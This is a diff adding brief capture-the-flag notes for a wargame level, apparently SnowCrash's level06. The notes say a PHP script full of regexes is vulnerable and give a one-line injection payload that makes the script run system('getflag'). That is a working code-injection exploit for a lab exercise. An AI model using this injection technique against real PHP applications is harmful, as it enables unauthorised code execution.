@@ -1,0 +1,5 @@
+level06 exec php script
+->Lot of regex
+solution seem to be an injection
+->echo '[x {${system('getflag')}}]' > /tmp/test && ./level06 /tmp/test toto
+Flag
